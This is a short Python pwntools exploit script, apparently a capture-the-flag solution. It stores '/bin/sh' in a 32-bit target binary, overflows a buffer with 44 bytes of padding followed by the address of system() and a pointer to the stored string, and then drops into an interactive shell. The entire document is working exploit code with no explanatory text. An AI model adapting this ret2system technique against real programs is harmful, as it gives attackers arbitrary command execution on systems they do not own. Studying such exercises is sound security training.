#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF(args.BIN)
r = ROP(e)

gs = '''
b system
b *0x804929d
b *0x804929e
continue
'''

first_prompt = 'You are allowed to store some value'

second_prompt = 'Enter the buffer now'


padding = b'A' * 44
system_str = b'\x60\xc0\x04\x08'
#system_str = b'\x08\x04\xc0\x60'
retn = p32(e.sym['system'])

buffer = padding + retn + b'CCCC' + system_str

print(buffer)

def start():
    if args.DEBUG:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

def run():
    p.recvuntil(first_prompt)
    p.sendline(bytes('/bin/sh', "latin-1"))
    p.recvuntil(second_prompt)
    p.sendline(buffer)

run()

p.interactive()
